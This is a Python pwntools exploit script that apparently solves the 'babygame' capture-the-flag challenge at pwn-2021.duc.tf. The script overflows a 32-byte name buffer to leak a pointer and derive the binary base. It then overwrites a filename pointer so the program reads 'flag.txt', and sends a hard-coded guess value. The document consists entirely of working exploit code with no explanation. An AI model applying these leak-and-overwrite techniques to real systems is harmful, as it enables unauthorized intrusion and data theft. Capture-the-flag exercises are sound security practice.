#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from binascii import *
import time
import os

context.update(arch='amd64')
exe = './babygame'
HOST = 'pwn-2021.duc.tf'
PORT = 31907

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b main
b game
continue
info variables RANDBUF
info variables NAME
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

j = 1
p = start()
if not args.REMOTE:
    print(p.pid)
p.recvuntil(b'name?')
p.sendline(b'A'*32)
p.sendline(b"2")
p.recvuntil(b"A"*32)

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f"RANDBUF LEAK @ {hex(leak)}")
bin_base = leak - 0x2024
log.info(f"BINARY BASE @ {hex(bin_base)}")
name_addr = bin_base + 0x40a0
log.info(f"NAME ADDR @ {hex(name_addr)}")


p.sendline(b'1')
p.recvline()
payload = b"flag.txt"
payload += b"\x00" * 24
payload += p64(name_addr)
p.sendline(payload)
p.sendline(b"1337")
p.sendline(str(0x54435544)) # may need to enter sequence manually 1337 -> 1413698884
p.interactive()

